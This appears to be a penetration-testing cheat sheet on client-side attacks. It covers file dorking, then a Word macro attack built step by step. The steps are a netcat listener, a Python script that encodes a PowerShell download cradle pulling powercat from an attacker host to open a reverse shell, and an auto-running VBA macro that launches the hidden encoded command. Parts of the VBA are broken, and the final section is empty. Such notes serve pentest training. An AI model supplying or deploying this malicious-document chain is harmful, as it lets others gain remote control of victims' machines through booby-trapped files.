# Client-side attacks

## Dorking

Passive: `site:www.site-to-hack.com filetype:pdf`
Gobuster: `gobuster dir -x pdf -u $TargetIp -w /usr/share/wordlist/dirb/commont.txt`
Exiftool: `exiftool -a -u somefile.pdf`

## Macros

### Word

Start a listener:
```
kali$ nc -lnvp $AttackerPort
```
base64 encode a PowerShell reverse shell, or a download cradle for [PowerCat](https://github.com/besimorhino/powercat):
```
import base64

text = "IEX(New-Object System.Net.WebClient).DownloadString('http://$AttackerIp/powercat.ps1');powercat -c $AttackerIp -p $AttackerPort -e powershell"

payload = base64.b64encode(bytes(text, 'utf-16-le')).decode('utf-8') # WARNING: Windows uses UTF-16-LE encoding...

print("PowerCat cradle:", text)
print("Payload, base64 utf-16-le encoded:", payload)

n = 50 

print("Str = \"powershell.exe -nop -w hidden -e \"")
for i in range(0, len(payload), n):
    print("Str = Str + " + '"' + payload[i:i+n] + '"')
```
start an http server:
```
kali$ python3 -m http.server 80
```
and embed it in Word macro:
```
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  Dim Str As String
  Str = "powershell.exe -nop -w hidden -enc"
  Str += Str + "some"
  Str += Str + "long"
  Str += Str + "base64"
  Str += Str + "utf-16-le"
  Str += Str + "string"
  CreateObject("Wscript.Shell").Run "Str"
End Sub
```

### Library files

```

```
